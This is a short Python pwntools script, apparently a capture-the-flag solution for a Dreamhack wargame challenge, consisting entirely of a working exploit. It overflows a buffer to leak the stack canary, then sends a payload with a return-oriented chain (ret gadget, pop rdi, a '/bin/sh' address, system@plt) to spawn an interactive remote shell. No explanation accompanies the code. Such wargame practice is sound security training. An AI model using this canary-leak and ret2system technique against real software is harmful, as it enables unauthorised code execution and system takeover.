from pwn import *

p = remote("host3.dreamhack.games", 21708)

leak = b''
leak += b'l' * 57

p.sendafter("Buf: ", leak)
p.recvuntil(leak)

canary = b'\x00'
canary += p.recv(7)


#exploit
poprdi = 0x0000000000400853 
ret = 0x0000000000400285 
binsh = 0x400874
systemplt = 0x4005d0


payload = b''
payload += b'a' * 56
payload += canary
payload += b's' * 8
payload += p64(ret)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(systemplt)
p.sendafter("Buf: ", payload)

p.interactive()